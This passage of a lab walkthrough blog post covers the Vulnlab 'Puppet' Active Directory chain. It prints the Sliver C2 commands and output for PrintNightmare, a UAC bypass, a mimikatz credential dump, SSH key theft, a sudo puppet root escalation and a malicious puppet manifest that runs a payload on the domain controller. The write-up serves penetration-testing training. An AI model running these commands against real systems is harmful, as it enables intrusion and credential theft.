gl"><pre class="lineno">1
2
3

</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>upload CVE-2021-34527.ps1
<span class="go">
</span><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>sharpsh <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-t</span> 300 <span class="nt">--</span> <span class="nt">-u</span> c:<span class="se">\\</span>temp<span class="se">\\</span>CVE-2021-34527.ps1 <span class="nt">-e</span> <span class="nt">-c</span> <span class="nv">SQBuAHYAbwBrAGUALQBOAGkAZwBoAHQAbQBhAHIAZQAgAC0ARAByAGkAdgBlAHIATgBhAG0AZQAgACIAWABlAHIAbwB4ADMAMAAxADAAIgAgAC0ATgBlAHcAVQBzAGUAcgAgACIAcgBlAGQAcAB1AHAAcABlAHQAIgAgAC0ATgBlAHcAUABhAHMAcwB3AG8AcgBkACAAIgBSAGUAZABQAHUAcABwAGUAdAAxADIAMwAiAA</span><span class="o">==</span>
</pre></table></code></div></div><p>Since we added a local user that is in the administrators group, we can now proceed to use <code class="language-plaintext highlighter-rouge">runas</code> to switch into its context by running the initial beacon payload once more:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>runas <span class="nt">-u</span> redpuppet <span class="nt">-P</span> <span class="s2">"RedPuppet123"</span> <span class="nt">-p</span> c:<span class="se">\\</span>programdata<span class="se">\\</span>puppet<span class="se">\\</span>puppet-update.exe
<span class="go">
[*] Successfully ran c:\programdata\puppet\puppet-update.exe  on puppet-mtls

[*] Beacon 913973f8 puppet-mtls - 10.10.144.230:51476 (File01) - windows/amd64 - Thu, 17 Oct 2024 14:44:15 CEST
</span></pre></table></code></div></div><p>This new beacon is however not in an elevated context due to UAC:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35

</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>sa-whoami
<span class="go">
[*] Tasked beacon puppet-mtls (cf6b98ac)

[+] puppet-mtls completed task cf6b98ac

[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:

UserName SID
====================== ====================================
FILE01\redpuppet S-1-5-21-2946821189-2073930159-359736154-1001

GROUP INFORMATION Type SID Attributes
================================================= ===================== ============================================= ==================================================
FILE01\None Group S-1-5-21-2946821189-2073930159-359736154-513 Mandatory group, Enabled by default, Enabled group,
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account and member of Administrators groupWell-known group S-1-5-114
BUILTIN\Administrators Alias S-1-5-32-544
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group,
CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group,
LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group,
Mandatory Label\Medium Mandatory Level Label S-1-16-8192 Mandatory group, Enabled by default, Enabled group,

Privilege Name Description State
============================= ================================================= ===========================
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</span></pre></table></code></div></div><p>Now we continue with an <a href="https://github.com/icyguider/UAC-BOF-Bonanza">UAC bypass</a> to finally get a system beacon:</p><p>Compiling the UAC bypass BOF:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2

</pre><td class="rouge-code"><pre><span class="go">cp -rp ~/dev/UACBypasses/SspiUacBypass /root/.sliver-client/extensions/
</span><span class="gp">cd /root/.sliver-client/extensions/SspiUacBypass/;</span><span class="w"> </span>make
</pre></table></code></div></div><p>Running the BOF:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="go">extensions load /home/xct/.sliver-client/extensions/SspiUacBypass
SspiUacBypass C:\\programdata\\puppet\\puppet-update.exe

Forging a token from a fake Network Authentication through Datagram Contexts
</span><span class="gp">Network Authentication token forged correctly, handle --&gt;</span><span class="w"> </span>0x2a4
<span class="go">Forged Token Session ID set to 1. lsasrv!LsapApplyLoopbackSessionId adjusted the token to our current session
Bypass Success! Now impersonating the forged token... Loopback network auth should be seen as elevated now
Invoking CreateSvcRpc (by @x86matthew)
Connecting to \\127.0.0.1\pipe\ntsvcs RPC pipe
Opening service manager...
Creating temporary service...
Executing 'C:\programdata\puppet\puppet-update.exe' as SYSTEM user...
Deleting temporary service...
Finished

[*] Beacon 15d1aae2 puppet-mtls - 10.10.144.230:51531 (File01) - windows/amd64 - Thu, 17 Oct 2024 14:48:30 CEST
</span></pre></table></code></div></div><p>This shows a new beacon as SYSTEM:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7

</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>beacons
<span class="go">
 ID         Name          Transport   Hostname   Username              Operating System   Last Check-In   Next Check-In
========== ============= =========== ========== ===================== ================== =============== ===============
 56d068c7   puppet-mtls   mtls        File01     PUPPET\Bruce.Smith    windows/amd64      15s             17s
</span><span class="gp"> 913973f8   puppet-mtls   mtls        File01     &lt;err&gt;</span><span class="w">                 </span>windows/amd64      2s              30s
<span class="go"> 15d1aae2   puppet-mtls   mtls        File01     NT AUTHORITY\SYSTEM   windows/amd64      2s              29s
</span></pre></table></code></div></div><p>From the new beacon we can now run mimikatz to dump credentials via the sideload functionality (sideload is essentially implementing a custom peloader to run pe files from memory):</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">use 15d1aae2
sideload /home/xct/drop/mimikatz.exe "token::elevate privilege::debug sekurlsa::logonpasswords exit"

</span><span class="c">...
</span><span class="go">msv :
[00000003] Primary
_ Username : svc_puppet_win_t1
_ Domain : PUPPET \* NTLM : 784c**\*
* SHA1 : e4b6*** \* DPAPI : abe7\*\*\*
</span><span class="c">...
</span></pre></table></code></div></div><p>Besides the hashes of bruce and the machine itself, we also get the hash of a new user: <code class="language-plaintext highlighter-rouge">svc_puppet_win_t1</code>. This account is likely the account that puppet uses to execute commands on tier one windows servers. According to the AD data we gathered there is also a <code class="language-plaintext highlighter-rouge">svc_puppet_win_t0</code> and a <code class="language-plaintext highlighter-rouge">svc_puppet_lin_t1</code> account.</p><p>One aspect we did not enumerate yet, is domain shares. So let’s first do it from the system account (which is just a normal domain user as well - the machine account of the server):</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19

</pre><td class="rouge-code"><pre><span class="go">sa-netshares dc01

Share:
---------------------file01----------------------------------
</span><span class="gp">ADMIN$</span><span class="w">
</span><span class="gp">C$</span><span class="w">
</span><span class="go">files
</span><span class="gp">IPC$</span><span class="w">
</span><span class="go">
sa-netshares dc01

Share:
---------------------dc01----------------------------------
</span><span class="gp">ADMIN$</span><span class="w">
</span><span class="gp">C$</span><span class="w">
</span><span class="gp">IPC$</span><span class="w">
</span><span class="go">it
NETLOGON
SYSVOL
</span></pre></table></code></div></div><p>Non-default shares are “files” on file01 where we already administrator and the it share on the dc. Let’s check if we can access the it share:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4

</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span><span class="nb">ls</span> <span class="se">\\\\</span>dc01.puppet.vl<span class="se">\\</span>it
<span class="go">
\\dc01.puppet.vl\it\ (0 items, 0 B)
==================================
</span></pre></table></code></div></div><p>We don’t have access there. Let’s check the new user we got earlier. This is the user running the puppet service, so without having to use pass-the-hash we could change the service config to obtain a beacon, and then change it back afterwards. Let’s first enumerate services:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>sa-sc-enum
<span class="c">...
</span><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>sa-sc-query file01 puppet
<span class="go">
[*] Successfully executed sa-sc-query (coff-loader)
[*] Got output:
SERVICE_NAME: puppet
	TYPE                 : 16 WIN32_OWN
	STATE                : 4 RUNNING
	WIN32_EXIT_CODE      : 0
	SERVICE_EXIT_CODE    : 0
	CHECKPOINT           : 0
	WAIT_HINT            : 0
	PID                  : 4040
	Flags                : 0
</span></pre></table></code></div></div><p>Now we could change the startup path and restart the service. There is a better way so I’m not going to do it, but here are the commands that would achieve it:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>obtaining the service path
<span class="go">sa-reg-query file01 2 System\\CurrentControlSet\\Services\\puppet ImagePath

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\puppet
ImagePath REG_EXPAND_SZ "C:\Program Files\Puppet Labs\Puppet\sys\ruby\bin\ruby.exe" -rubygems "C:\Program Files\Puppet Labs\Puppet\service\daemon.rb"

</span><span class="gp">#</span><span class="w"> </span>changing the service path
<span class="go">execute -o -s -- c:\\windows\\system32\\cmd.exe /c sc config puppet binPath=c:\\programdata\\puppet\\puppet-update.exe
execute -o -s -- c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -c "Restart-Service -Name puppet"

</span><span class="c">...
</span><span class="go">[*] Beacon 55fa6e2a puppet-mtls - 10.10.144.230:52071 (File01) - windows/amd64 - Thu, 17 Oct 2024 15:23:40 CEST

</span><span class="gp">#</span><span class="w"> </span>restoring the service path
<span class="go">execute -o -s -- c:\\windows\\system32\\cmd.exe /c sc config puppet binPath="\"C:\\Program Files\\Puppet Labs\\Puppet\\sys\\ruby\\bin\\ruby.exe\" -rubygems \"C:\\Program Files\\Puppet Labs\\Puppet\\service\\daemon.rb\""
execute -o -s -- c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -c "Restart-Service -Name puppet"
</span></pre></table></code></div></div><p>The problem with this is, although it works its a bit invasive and times out quickly due to being a service. A better approach is finding the existing process and injection/migrating to it:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9

</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>ps
<span class="go">
</span><span class="c">...
</span><span class="go">4832   656    PUPPET\svc_puppet_win_t1       x86_64   ruby.exe
</span><span class="c">...
</span><span class="go">
</span><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w">  </span>migrate <span class="nt">-p</span> 4832
<span class="go">
[*] Successfully migrated to 4832
</span></pre></table></code></div></div><p>From the new beacon as <code class="language-plaintext highlighter-rouge">svc_puppet_win_t1</code> we can now list the share on the domain controller, since this account has access rights to it:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span><span class="nb">ls</span> <span class="se">\\\\</span>dc01.puppet.vl<span class="se">\\</span>it
<span class="go">
\\dc01.puppet.vl\it\ (3 items, 813.9 KiB)
=========================================
</span><span class="gp">drwxrwxrwx  .ssh          &lt;dir&gt;</span><span class="w">      </span>Sat Oct 12 01:39:50 <span class="nt">-0700</span> 2024
<span class="gp">drwxrwxrwx  firewalls     &lt;dir&gt;</span><span class="w">      </span>Sat Oct 12 01:15:05 <span class="nt">-0700</span> 2024
<span class="go">-rw-rw-rw-  PsExec64.exe  813.9 KiB  Sat Oct 12 01:07:00 -0700 2024
</span></pre></table></code></div></div><p>We can now see that we have indeed access and look around a bit.</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span><span class="nb">ls</span> <span class="se">\\\\</span>dc01.puppet.vl<span class="se">\\</span>it<span class="se">\\</span>.ssh
<span class="go">
\\dc01.puppet.vl\it\.ssh (2 items, 580 B)
=========================================
-rw-rw-rw-  ed25519      472 B  Sat Oct 12 01:14:23 -0700 2024
-rw-rw-rw-  ed25519.pub  108 B  Sat Oct 12 01:40:09 -0700 2024

</span><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>download <span class="se">\\\\</span>dc01.puppet.vl<span class="se">\\</span>it<span class="se">\\</span>.ssh<span class="se">\\</span>ed25519
<span class="go">
[*] Tasked beacon puppet-mtls (9b246218)

</span><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>download <span class="se">\\\\</span>dc01.puppet.vl<span class="se">\\</span>it<span class="se">\\</span>.ssh<span class="se">\\</span>ed25519.pub
<span class="go">
[*] Tasked beacon puppet-mtls (0a09f6ff)
</span></pre></table></code></div></div><p>From the content of the files, we learn that this is a ssh private key for the account <code class="language-plaintext highlighter-rouge">svc_puppet_lin_t1@puppet.vl</code> (note that you may have to convert line endings since this key came from a windows machine). Although sliver has a functionality to run ssh commands from a beacon, I didn’t have much luck getting it to work. So we are going to setup a port forward to ssh from our attacker machine:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7

</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>forward port from a session or beacon
<span class="go">portfwd add --bind 2222 -r 10.10.144.231:22
</span><span class="c">...
</span><span class="go">ssh -i svc_puppet_lin_t1 -t 'svc_puppet_lin_t1@puppet.vl'@127.0.0.1 -p 2222
</span><span class="c">...
</span><span class="go">Last login: Sat Oct 12 18:18:52 2024 from 10.8.0.101
</span><span class="gp">svc_puppet_lin_t1@puppet.vl@puppet:~$</span><span class="w">
</span></pre></table></code></div></div><p>This worked and we have access to the puppet master machine now:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">sudo -l
Matching Defaults entries for svc_puppet_lin_t1@puppet.vl on puppet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc_puppet_lin_t1@puppet.vl may run the following commands on puppet:
(ALL) NOPASSWD: /usr/bin/puppet
</span></pre></table></code></div></div><p>Since this user is supposed to be here, he can also execute puppet as root. We can also use this for a quick privilege escalation:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5

</pre><td class="rouge-code"><pre><span class="go">sudo puppet apply -e "exec { '/bin/sh -c \"chmod u+s /bin/bash\"': }"

bash -p
</span><span class="gp">bash-5.1#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=451001132(svc_puppet_lin_t1@puppet.vl) gid=451000513(domain users@puppet.vl) euid=0(root) groups=451000513(domain users@puppet.vl),451001133(admins_t1@puppet.vl)
</span></pre></table></code></div></div><p>Let’s add a key to root and continue as the root user. Let’s enumerate the machines controlled by this one via puppet:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5

</pre><td class="rouge-code"><pre><span class="go">puppet cert list --all

- "dc01.puppet.vl" (SHA256) E4:C3:42:71:83:88:08:07:6A:C5:A1:9D:FA:C2:7E:BB:D5:65:5F:71:9F:D3:BE:11:96:B7:26:CD:4F:5C:68:C6
- "file01.puppet.vl" (SHA256) 61:ED:86:C3:55:35:36:89:D5:FC:3A:32:05:D1:23:EC:C3:F1:58:E4:D7:9A:6B:3E:65:F4:F2:F2:77:34:B0:CA
- "puppet.puppet.vl" (SHA256) 11:65:85:DB:9F:E4:19:03:04:21:92:4B:19:03:17:6D:29:A9:E9:56:0F:04:A6:16:2B:44:46:A3:33:20:92:9C (alt names: "DNS:puppet", "DNS:puppet.puppet.vl")
</span></pre></table></code></div></div><p>We can see that both file01 and the dc are controlled by this puppet master instance. Although we don’t know which accounts the agents run as (besides for file01) we can guess that it’s probably <code class="language-plaintext highlighter-rouge">svc_puppet_win_t0</code> for the domain controller. Let’s find a way to run a command there:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">mkdir -p /etc/puppet/code/environments/production/manifests
nano /etc/puppet/code/environments/production/manifests/site.pp

node 'dc01.puppet.vl' {
exec { 'pwned':
</span><span class="gp"> command =&gt;</span><span class="w"> </span><span class="s1">'C:\\Windows\\System32\\cmd.exe /c \\\\file01.puppet.vl\\files\\update.exe'</span>,
<span class="gp"> logoutput =&gt;</span><span class="w"> </span><span class="nb">true</span>,
<span class="go"> }
}
node default {
notify { 'This is the default node': }
}
</span></pre></table></code></div></div><p>Note that we are trying to run a payload of a smb share on the file server we are on. We also have to copy the payload there. Finally we can try to run the payload:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1

</pre><td class="rouge-code"><pre><span class="go">puppet apply /etc/puppet/code/environments/production/manifests/site.pp 
</span></pre></table></code></div></div><p>It’s up the agent to pickup the change. On default settings this is every 30 minutes, but here the agent is checking in every minute to help with the exploitation.</p><p>Shortly after we get a beacon from the dc:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="go">[*] Beacon 66b57ae6 puppet-mtls - 10.10.144.229:63253 (DC01) - windows/amd64 - Thu, 17 Oct 2024 16:07:46 CEST

</span><span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>use 66b57ae6
<span class="gp">sliver (puppet-mtls) &gt;</span><span class="w"> </span>sa-whoami
<span class="go">
UserName SID
====================== ====================================
PUPPET\svc_puppet_win_t0 S-1-5-21-3066630505-2324057459-3046381011-1602
</span></pre></table></code></div></div><p>This gives full admin privileges on the DC, the final flag is however not in the usual location - on this machine it’s the password of one of the users. So we have to dump credentials to obtain it.</p><p>That’s it for this chain, I hope it was fun!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/vulnlab/">Vulnlab</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >active directory</a> <a href="/tags/c2/" class="post-tag no-text-decoration" >c2</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/sliver/" class="post-tag no-text-decoration" >sliver</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=VL%20Puppet%20-%20xct's%20blog&url=https%3A%2F%2Fvuln.dev%2Fvulnlab-puppet%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fvuln.dev%2Fvulnlab-puppet%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/silver-ticket-mssql-clr/">MSSQL Silver Tickets and Token Privileges</a><li class="text-truncate lh-lg"> <a href="/vulnlab-odori/">VL Odori</a><li class="text-truncate lh-lg"> <a href="/vulnlab-barrier/">VL Barrier</a><li class="text-truncate lh-lg"> <a href="/vulnlab-redelegate/">VL Redelegate</a><li class="text-truncate lh-lg"> <a href="/vulnlab-mythical/">VL Mythical</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag btn btn-outline-primary" href="/tags/linux/">linux</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/binary-exploitation/">binary exploitation</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">active directory</a> <a class="post-tag btn btn-outline-primary" href="/tags/sql-injection/">sql injection</a> <a class="post-tag btn btn-outline-primary" href="/tags/command-injection/">command injection</a> <a class="post-tag btn btn-outline-primary" href="/tags/cve/">cve</a> <a class="post-tag btn btn-outline-primary" href="/tags/pg-practice/">pg practice</a> <a class="post-tag btn btn-outline-primary" href="/tags/kernel-exploit/">kernel exploit</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/vulnlab-mythical/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1733612400" data-df="ll" > Dec 8, 2024 </time><h4 class="pt-0 my-2">VL Mythical</h4><div class="text-muted"><p>This video is a walkthrough on Mythical, a medium-difficulty AD chain on Vulnlab that is all about engaging AD environments with the Mythic C2 framework. {% youtube CPOJt-Gujkc %} Notes These ar...</p></div></div></a></article><article class="col"> <a href="/vulnlab-redelegate/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1732316400" data-df="ll" > Nov 23, 2024 </time><h4 class="pt-0 my-2">VL Redelegate</h4><div class="text-muted"><p>Redelegate is a hard-rated Windows machine by Geiseric on Vulnlab. The core concepts here are password spraying, enumerating domain users via MSSQL and diving deeper into kerberos delegation. Enum...</p></div></div></a></article><article class="col"> <a href="/vl-shinra-those-pesky-humans-initial-payload-design-host-enumeration-getting-system/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1673996400" data-df="ll" > Jan 18, 2023 </time><h4 class="pt-0 my-2">VL Shinra Part 3 - Initial Payload Design, Host Enumeration & getting SYSTEM</h4><div class="text-muted"><p>This is the third video of the Shinra series. We will get a shell on Ashleighs machine &amp; escalate privileges. Topics Phishing: Payload design &amp; getting a shell Sliver Basics Host...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/vulnlab-cicada/" class="btn btn-outline-primary" aria-label="Older" ><p>VL Cicada</p></a> <a href="/vulnlab-redelegate/" class="btn btn-outline-primary" aria-label="Newer" ><p>VL Redelegate</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2026</time> <a href="https://twitter.com/xct_de">xct</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.4.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" 